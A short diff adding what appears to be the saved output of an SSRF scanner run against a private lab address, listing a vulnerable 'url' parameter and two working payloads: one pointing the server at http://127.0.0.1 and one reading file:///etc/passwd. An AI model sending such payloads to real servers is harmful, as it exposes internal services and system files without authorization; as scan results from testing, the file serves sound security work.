@@ -1,0 +1,13 @@
+[
+    "[+]url: http://192.168.1.107/ssrf.php",
+    "[+]parameter: url",
+    "[+]payload: http://192.168.1.107/ssrf.php?url=http://127.0.0.1",
+    "[+]protocol: http",
+    ""
+][
+    "[+]url: http://192.168.1.107/ssrf.php",
+    "[+]parameter: url",
+    "[+]payload: http://192.168.1.107/ssrf.php?url=file:///etc/passwd",
+    "[+]protocol: file",
+    ""
+]
